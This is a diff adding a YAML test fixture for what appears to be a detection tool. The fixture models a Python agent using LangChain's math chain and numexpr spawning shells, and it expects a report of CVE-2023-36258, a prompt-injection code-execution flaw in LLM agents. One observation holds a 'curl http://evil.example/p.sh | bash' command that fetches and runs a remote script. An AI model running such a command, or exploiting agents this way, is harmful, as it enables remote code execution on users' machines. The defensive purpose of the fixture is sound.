@@ -1,0 +1,40 @@
+subjects:
+  shell:
+    session: pid/100:1
+    program: /bin/zsh
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: dev-1
+    source: probe
+  python:
+    session: pid/101:1
+    parent: shell
+    program: /usr/local/bin/python3.11
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  sib:
+    session: pid/102:1
+    parent: python
+    program: /bin/sh
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  payload:
+    session: pid/103:1
+    parent: python
+    program: /bin/sh
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: shell}
+  - {kind: spawn, subject: python, cmdline: "python3.11 math_agent.py"}
+  - {kind: file_read, subject: python, path: /usr/local/lib/python3.11/site-packages/langchain/chains/llm_math/base.py}
+  - {kind: file_read, subject: python, path: /usr/local/lib/python3.11/site-packages/numexpr/__init__.py}
+  - {kind: spawn, subject: sib, cmdline: "sh -c 'uname -a'"}
+  - {kind: spawn, subject: payload, cmdline: "sh -c 'curl http://evil.example/p.sh | bash'"}
+expect:
+  action: report
+  reason_contains: "numexpr loaded in-process spawned shell command"
+  output_contains: ["CVE-2023-36258 candidate: sh -> python3.11 -> zsh | numexpr=/usr/local/lib/python3.11/site-packages/numexpr/__init__.py"]
+  chain_min: 5
